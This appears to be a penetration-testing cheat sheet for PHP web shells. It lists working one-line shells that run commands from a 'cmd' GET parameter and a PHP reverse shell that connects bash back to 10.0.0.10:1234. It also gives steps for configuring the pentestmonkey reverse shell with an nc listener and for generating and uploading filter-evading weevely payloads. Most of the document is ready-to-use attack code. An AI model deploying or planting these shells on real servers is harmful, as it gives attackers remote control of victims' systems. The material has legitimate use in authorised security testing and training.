# Web Shells - PHP


The simplest way to test if you have code execution on a server is:
<?php phpinfo(); ?>

## Execute PHP Commands


For these you will have to navigate to the web page, and provide a cmd GET parameter. For example:
http://website.com/mypage.php?cmd=whoami

<?php system($_GET['cmd']); ?>
<?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
<?php echo shell_exec($_GET["cmd"]);?>

## Tiny PHP Reverse Shell


https://gist.github.com/rshipp/eee36684db07d234c1cc
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'") ?>
Or if ' inside of " are causing issues - replace the ' with " and escape the internal ones
<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.10/1234 0>&1\""); ?>

## pentestmonkey


http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Alternatively on Kali, the shell can be found in /usr/share/webshells/php/php-reverse-shell.php

1) Copy it to your current directory so you can work with it
cp /usr/share/webshells/php/php-reverse-shell.php .
2) Rename it
mv php-reverse-shell.php monkey.php
3) Edit it
nano monkey.php
$ip = '127.0.0.1'; // CHANGE THIS
$port = 1234; // CHANGE THIS
4) Get ready to catch the shell on your attacking machine
nc -lvnp <port>
5) Trigger the reverse shell on your target machine

You should now get a callback on your listener :))

## Dhayalanb - Windows PHP Reverse Shell


https://github.com/Dhayalanb/windows-php-reverse-shell
This writes a .exe to the filesystem.

### About


On Windows, php reverse shells need to:
• use exec
• or drop a file and execute it with shell_exec
◇ because shell_exec will call your comamnd and then immediately return the output (doens't wait for mroe commands)
◇ https://old.reddit.com/r/AskNetsec/comments/4kta76/php_reverse_shell_from_windows/

## weevely


https://github.com/epinna/weevely3
Weevely is useful because it will generate an encoded payload that maybe bypasses some filters.

1) Generate a shell
weevely generate <password> <path>
2) Upload shell to the target
3) Access the shell on the target
weevely <url> <password>
